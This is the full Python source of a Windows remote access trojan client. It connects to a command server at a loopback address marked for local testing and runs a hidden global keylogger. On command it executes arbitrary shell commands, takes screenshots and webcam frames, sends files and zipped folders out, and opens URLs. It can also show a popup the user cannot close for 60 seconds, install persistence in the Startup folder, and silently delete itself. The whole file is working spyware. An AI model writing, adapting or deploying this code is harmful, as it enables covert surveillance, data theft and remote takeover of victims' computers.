import os
import socket
import subprocess
import shutil
import sys
import time
from PIL import ImageGrab  # Screen capture utility
import io
import struct
import cv2
import keyboard  # Global keyboard monitoring
import threading  # Thread management
import platform  # Platform metadata gathering
import webbrowser  # Browser interaction
import ctypes  # Windows API access
import tkinter as tk  # GUI toolkit

# --- Configuration ---
# --- Configuration ---
TARGET_IP = "127.0.0.1"  # local testing loopback
TARGET_PORT = 9998

# --- Global States ---
keylog_storage = ""  # Buffer for captured keystrokes
is_hebrew_mode = False  # Hebrew layout active state

# --- Keyboard Mapping (QWERTY to Hebrew) ---
ENG_TO_HEB = {
    'q': '/', 'w': "'", 'e': 'ק', 'r': 'ר', 't': 'א', 'y': 'ט', 'u': 'ו', 'i': 'ן', 'o': 'ם', 'p': 'פ',
    'a': 'ש', 's': 'ד', 'd': 'ג', 'f': 'כ', 'g': 'ע', 'h': 'י', 'j': 'ח', 'k': 'ל', 'l': 'ך', ';': 'ף',
    'z': 'ז', 'x': 'ס', 'c': 'ב', 'v': 'ה', 'b': 'נ', 'n': 'מ', 'm': 'צ', ',': 'ת', '.': 'ץ', '/': '.'
}


def keylogger_engine():
    global keylog_storage
    global is_hebrew_mode

    def on_key_event(event):
        global keylog_storage
        global is_hebrew_mode

        try:  # Prevent hook thread crashes
            if event.event_type == keyboard.KEY_DOWN:
                key = event.name

                # --- Capture hotkeys (Ctrl combos) ---
                if keyboard.is_pressed('ctrl'):
                    if key in ['ctrl', 'right ctrl', 'left ctrl']: return
                    keylog_storage += f"[Ctrl+{key}]"
                    return

                # --- Capture hotkeys (Alt combos) ---
                if keyboard.is_pressed('alt') and key not in ['shift', 'right shift']:
                    if key in ['alt', 'right alt', 'left alt']: return
                    keylog_storage += f"[Alt+{key}]"
                    return

                # --- Handle layout toggle (Alt+Shift) ---
                if (key == 'shift' and keyboard.is_pressed('alt')) or \
                        (key == 'alt' and keyboard.is_pressed('shift')):
                    is_hebrew_mode = not is_hebrew_mode
                    return

                # --- Handle whitespace and control keys ---
                if key == 'space':
                    keylog_storage += " "
                elif key == 'enter':
                    keylog_storage += "\n"
                elif key == 'backspace':
                    keylog_storage = keylog_storage[:-1]
                elif key in ['shift', 'caps lock', 'tab', 'right shift', 'up', 'down', 'left', 'right']:
                    pass

                # --- Character translation logic ---
                elif len(key) == 1:
                    char_to_add = key
                    if is_hebrew_mode:
                        char_to_add = ENG_TO_HEB.get(key.lower(), key)

                    keylog_storage += char_to_add

                else:
                    pass

        except Exception as e:
            # Suppress/log hook thread exceptions
            print(f"Keylogger Error: {e}")

    # Register global hook
    keyboard.hook(on_key_event)


def become_persistent():
    """ Establishes persistence via Windows Startup folder """
    try:
        if getattr(sys, 'frozen', False):
            current_file = sys.executable
        else:
            current_file = os.path.abspath(__file__)

        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        base_name = os.path.basename(current_file)
        destination = os.path.join(startup_folder, base_name)

        if not os.path.exists(destination):
            shutil.copy2(current_file, destination)
    except Exception:
        pass


def send_data(sock, data):
    """ Sends size-prefixed data frames over TCP socket """
    if isinstance(data, str):
        data = data.encode('utf-8')

    data_len = len(data)
    # Pack payload length (4-byte big-endian integer)
    header = struct.pack('>I', data_len)

    # 1. Send header prefix
    sock.sendall(header)

    # 2. Prevent socket stream coalescence
    time.sleep(0.05)

    # 3. Send raw payload
    sock.sendall(data)


# -------
def send_file_to_server(sock, filename):
    """ Reads local file and transmits binary payload over socket """
    if os.path.exists(filename):
        try:
            with open(filename, 'rb') as f:
                file_data = f.read()

            # Transmit structured payload
            send_data(sock, file_data)
            return True
        except Exception as e:
            send_data(sock, f"Error sending file: {e}")
            return False
    else:
        send_data(sock, "ERR: File not found")
        return False


def start_client():
    global keylog_storage

    # Initialize keylogger engine in background
    print("[*] Starting Keylogger in background...")
    keylogger_engine()

    while True:
        try:
            my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            my_socket.connect((TARGET_IP, TARGET_PORT))

            while True:
                try:
                    command = my_socket.recv(1024).decode(errors='ignore').strip()
                except:
                    break

                if not command:
                    break

                if command.lower() == "exit":
                    my_socket.close()
                    return

                # --- Retrieve keylogger buffer ---
                if command.lower() == "get_keys":
                    try:
                        if keylog_storage:
                            response = f"\n--- Keylog Dump ---\n{keylog_storage}\n-------------------"
                            send_data(my_socket, response)
                            keylog_storage = ""  # Reset buffer on successful exfiltration
                        else:
                            send_data(my_socket, "No keys recorded yet.")
                    except Exception as e:
                        send_data(my_socket, f"Error getting keys: {str(e)}")
                    continue  # Bypass shell execution

                # --- Capture screen ---
                elif command.lower() == "screenshot":
                    try:
                        screenshot = ImageGrab.grab()

                        # Buffer image in-memory as PNG
                        img_byte_arr = io.BytesIO()
                        screenshot.save(img_byte_arr, format='PNG')

                        # Exfiltrate raw data
                        img_data = img_byte_arr.getvalue()
                        send_data(my_socket, img_data)

                    except Exception as e:
                        error_msg = f"Error taking screenshot: {str(e)}"
                        send_data(my_socket, error_msg)
                    continue  # Bypass shell execution

                # --- Capture camera frame ---
                if command.lower() == "cam":
                    try:
                        # Initialize camera interface (using DirectShow API)
                        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                        if not cap.isOpened():
                            send_data(my_socket, "Error: Webcam not found")
                            continue  

                        ret, frame = cap.read()
                        cap.release()

                        if not ret:
                            send_data(my_socket, "Error: Failed to capture frame")
                            continue

                        # Compress raw frame to JPEG format for network efficiency
                        success, buffer = cv2.imencode('.jpg', frame)

                        if success:
                            send_data(my_socket, buffer.tobytes())
                        else:
                            send_data(my_socket, "Error: Failed to encode image")

                    except Exception as e:
                        error_msg = f"Cam Error: {str(e)}"
                        send_data(my_socket, error_msg)

                    continue  # Bypass shell execution

                # --- File download ---
                if command.lower().startswith("download "):
                    path_to_file = command[9:].strip()
                    send_file_to_server(my_socket, path_to_file)
                    continue  

                # --- Directory compression ---
                if command.lower().startswith("zip "):
                    try:
                        folder_to_zip = command[4:].strip()

                        if os.path.isdir(folder_to_zip):
                            shutil.make_archive(folder_to_zip, 'zip', folder_to_zip)
                            response = f"[+] Folder zipped successfully! You can now download '{folder_to_zip}.zip'"
                        else:
                            response = "[-] Error: Not a folder or directory not found."

                    except Exception as e:
                        response = f"[-] Zip Error: {str(e)}"

                    send_data(my_socket, response)
                    continue  

                # --- Silent self-destruction protocol ---
                if command.lower() == "terminate_all":
                    try:
                        # 1. Remove persistence artifacts
                        startup_folder = os.path.join(os.getenv('APPDATA'),
                                                      r'Microsoft\Windows\Start Menu\Programs\Startup')

                        if getattr(sys, 'frozen', False):
                            current_file = sys.executable
                        else:
                            current_file = os.path.abspath(__file__)

                        base_name = os.path.basename(current_file)
                        startup_file = os.path.join(startup_folder, base_name)

                        if os.path.exists(startup_file):
                            os.remove(startup_file)

                        # 2. Build self-deletion command (delay execution to allow process termination)
                        destruct_cmd = f'ping 127.0.0.1 -n 3 > nul & del /f /q "{current_file}"'

                        # 3. Suppress console window execution (Stealth mode)
                        si = subprocess.STARTUPINFO()
                        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

                        subprocess.Popen(destruct_cmd, shell=True, startupinfo=si)

                        # 4. Notify C2 and terminate process
                        send_data(my_socket, "[!] Self-destruct initiated. Goodbye.")
                        my_socket.close()
                        sys.exit(0)  

                    except Exception as e:
                        send_data(my_socket, f"[-] Error self-destruct: {str(e)}")
                    continue

                # --- Gather system metadata ---
                if command.lower() == "sysinfo":
                    info = f"""
                                    --- System Info ---
                                    OS: {platform.system()}
                                    Version: {platform.version()}
                                    Machine: {platform.machine()}
                                    Processor: {platform.processor()}
                                    User: {os.getlogin()}
                                    """
                    send_data(my_socket, info)
                    continue

                # --- GUI interaction payload ---
                if command.lower().startswith("msgbox "):
                    message = command[7:].strip()

                    def show_locked_popup():
                        try:
                            root = tk.Tk()
                            root.title("System Alert")
                            root.geometry("400x250+500+300")

                            # Strip window decorations
                            root.overrideredirect(True)

                            # Set always on top
                            root.attributes("-topmost", True)
                            root.configure(bg='#8B0000')  

                            label = tk.Label(root, text=message, font=("Arial", 14, "bold"),
                                             bg='#8B0000', fg='white', wraplength=350)
                            label.pack(expand=True, pady=20)

                            warning = tk.Label(root, text="(Wait 60 seconds to close)", font=("Arial", 10),
                                               bg='#8B0000', fg='yellow')
                            warning.pack(pady=5)

                            # Schedule unlock button activation
                            def unlock_window():
                                print('\a')
                                btn = tk.Button(root, text="CLOSE", command=root.destroy,
                                                font=("Arial", 12, "bold"), bg="white", fg="black", width=15)
                                btn.pack(pady=20)
                                warning.config(text="You can now close this window.")

                            # Set 60-second timer
                            root.after(60000, unlock_window)

                            root.mainloop()
                        except Exception:
                            pass

                    # Run GUI mainloop on detached thread to prevent C2 blocking
                    t = threading.Thread(target=show_locked_popup)
                    t.start()

                    send_data(my_socket, "[+] Locked popup displayed. User cannot close it for 60s.")
                    continue

                # --- Browser execution payload ---
                if command.lower().startswith("openurl "):
                    url = command[8:].strip()
                    webbrowser.open(url)
                    send_data(my_socket, f"[+] Opened URL: {url}")
                    continue

                # --- Directory traversal ---
                if command.lower().startswith("cd "):
                    try:
                        path_to_go = command[3:].strip()
                        os.chdir(path_to_go)
                        response = f"Changed directory to: {os.getcwd()}"
                    except Exception as e:
                        response = str(e)
                    send_data(my_socket, response)
                    continue

                # --- Subprocess shell execution ---
                command_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output, error = command_process.communicate()

                # Handle encoding and compatibility
                try:
                    res = output.decode('cp1255') + error.decode('cp1255')
                except:
                    res = output.decode('utf-8', errors='ignore') + error.decode('utf-8', errors='ignore')

                if not res:
                    res = "Command executed successfully (no output)"

                send_data(my_socket, res)


        except Exception as e:

            print("\n\n")

            print("X" * 50)

            print(f"    THE REASON FOR FAILURE: {e}")

            print("X" * 50)

            print("\n\n")

            time.sleep(5)


if __name__ == '__main__':
    # become_persistent()
    start_client()
